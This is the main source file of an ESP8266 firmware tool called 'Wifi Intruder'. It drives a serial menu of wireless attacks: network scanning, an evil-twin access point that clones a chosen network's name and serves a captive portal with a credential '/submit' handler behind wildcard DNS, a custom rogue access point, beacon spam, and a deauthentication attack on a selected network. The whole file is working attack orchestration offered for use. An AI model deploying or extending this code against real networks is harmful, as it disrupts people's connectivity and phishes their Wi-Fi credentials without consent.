#include <ESP8266WiFi.h>
#include "View.h"
#include "WebPortal.h"
#include "NetworkList.h"
#include "Attacks.h"

IPAddress local_IP(192,168,4,22);
IPAddress subnet(255,255,255,0);

ESP8266WebServer server(DEFAULT_PORT);
DNSServer dnsServer;

NetworkList networks;

String custom_AP_SSID;
bool apStarted = false; // to see if there is a point running
bool internetConnection = false;
bool attacking = false; //if any attacks are happening
uint8_t intInput = 0;

void setup() {
    WiFi.disconnect(); // Disconnect from any previously connected network
    wifi_promiscuous_enable(1);
    if (!WiFi.mode(WIFI_AP_STA)){
      Serial.println("Wifi mode couldn't be setup properly");
    }

    delay(500); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();

    Serial.print("\n");
    Serial.println("Welcome to Wifi Intruder. Have FUN! :]\n");

    delay(10);
}


void loop(){
    mainMenu();
    delay(10);
}

void mainMenu(){
    if (!attacking){

        View::printInstruction();
        uint8_t menuInput=0;
        View::getIntInput(menuInput);

        switch (menuInput){
            case 1:
                findNewNetworks();
                break;
            case 2:
                evilTwin();
                break;
            case 3:
                createCustomAP();
                attacking = true;
                break;
            case 4:
                handleBeaconSpam();
                break;
            case 5:
                handleDeauthAttack();
                break;
            case 6: // control attacks
              break;
            default:
                Serial.println("Enter a Valid Answer: ");
                View::printInstruction();
                break;
        }
    } else{

        if(apStarted){
            dnsServer.processNextRequest();
            server.handleClient();
        }
    }
}

int8_t getNetworkIndex(){
    if(networks.getSize() == 0){
        Serial.println("No networks observed.");
        return -1;
    }

    Serial.print("\nEnter network #: ");
    uint8_t networkNum;
    View::getIntInput(networkNum);

    if(networkNum > 0 && networkNum <= networks.getSize()){
      Serial.printf("\nChoosing network #%d: %s\n", networkNum, networks.getNetwork(networkNum-1)->getSSID()->c_str());
        return networkNum -1;
    }else{
        Serial.println("Invalid network number.");
    }
    return -1;
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");
    int8_t newNumNetworks = WiFi.scanNetworks();
    String SSID;
    String BSSIDstr;
    uint8_t BSSID[6];
    float RSSI;
    uint8_t channel;

    for (int8_t i = 0; i < newNumNetworks; i++){
        SSID = WiFi.SSID(i);
        BSSIDstr = WiFi.BSSIDstr(i);
        memcpy(BSSID, WiFi.BSSID(i), 6);
        RSSI = WiFi.RSSI(i);
        channel = WiFi.channel(i);

        networks.addNetwork(SSID, BSSIDstr, BSSID, RSSI, channel);
   
    }
    networks.printNetworks();
}

void evilTwin(){
    int8_t networkIndex = getNetworkIndex();
    if(networkIndex != -1){
        custom_AP_SSID = *(networks.getNetwork(networkIndex)->getSSID());
        attacking = createAP();
    }else{
      attacking = false;
    }
}

void createCustomAP(){
    Serial.print("Enter custom SSID: ");
    View::getStrInput(custom_AP_SSID);
    attacking = createAP();
}

bool createAP(){
    Serial.print("Creating network: ");
    Serial.println(custom_AP_SSID);
    
    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
        Serial.println("Failed to configure AP");
        return false;
    }
    
    //WiFi.softAP(custom_AP_SSID, AP_PASSWORD,1, false, 4)
    if (!WiFi.softAP(custom_AP_SSID)) {
        Serial.println("Failed to start AP");
        return false;
    }

    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
        Serial.println("Failed to start DNS Server");
        return false;
    }

    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.onNotFound([]() {
        WebPortal::handleConnect();
    });

    server.on("/submit", []() {
        WebPortal::handleSubmit();
    });
    //server.onNotFound(handleNotFound);
    server.begin();
    apStarted = true;
    
    return true;
}

void handleBeaconSpam(){
    attacking = true;
    beaconSpam();
}

void handleDeauthAttack(){
    int8_t networkNum = getNetworkIndex();

    if(networkNum != -1){
        attacking = true;
        deauthNetwork(
            networks.getNetwork(networkNum)->getChannel(), 
            networks.getNetwork(networkNum)->getBSSID()
        );
    }
}